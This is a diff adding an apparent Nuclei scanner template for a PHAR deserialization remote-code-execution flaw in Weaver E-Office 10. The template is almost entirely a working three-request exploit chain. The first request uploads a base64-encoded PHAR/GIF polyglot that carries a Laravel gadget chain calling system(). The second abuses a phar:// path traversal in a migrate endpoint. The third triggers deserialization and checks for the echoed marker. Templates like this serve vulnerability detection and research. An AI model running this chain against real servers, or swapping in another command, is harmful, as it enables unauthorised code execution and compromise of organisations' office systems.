@@ -1,0 +1,77 @@
+id: e-office-atuh-file-rce
+
+info:
+  name: Weaver E-Office atuh-file - Deserialization
+  author: qwtd
+  severity: critical
+  description: |
+    漏洞的关键在于系统处理上传的PHAR文件时存在缺陷。攻击者能够上传伪装的PHAR文件到服务器，利用PHP处理PHAR文件时自动进行的反序列化机制来触发远程代码执行
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Office10%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8Ev10.0_20240222%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/hi-unc1e/afrog/blob/7725b4cb6562db7f3a6a8a7a8923d8891cf43d3c/pocs/afrog-pocs/vulnerability/yaml-poc-weaver-weaver_e_office-deserialization-CT-1156977.yml#L19
+  tags: 泛微-EOffice
+
+variables:
+  boundary: "{{rand_text_alphanumeric(8)}}"
+  payload: "{{base64_decode('R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpEAQAAAQAAABEAAAABAAAAAAAOAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Mzc6ImVjaG8gOXlNODZFU3lGQlhORHdDaDZOYnN4eTl3cmNRclAyNVAiO319CAAAAHRlc3QudHh0BAAAAEvbA2YEAAAADH5/2KQBAAAAAAAAdGVzdIEpwGmDhmYzxumoAjJwcaz4EdU+AgAAAEdCTUI=')}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+        
+        {{payload}}
+        --{{boundary}}--
+    matchers-condition: and
+    extractors:
+      - type: regex
+        name: attachment_id
+        internal: true
+        part: body
+        regex:
+          - '"attachment_id":"(?P<attachment_id>.+?)"'
+        group: 1
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "attachment_id"
+
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":1'
+
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/empower/import HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=tttt&file={{attachment_id}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P"
+          - '"code":"no_file"'
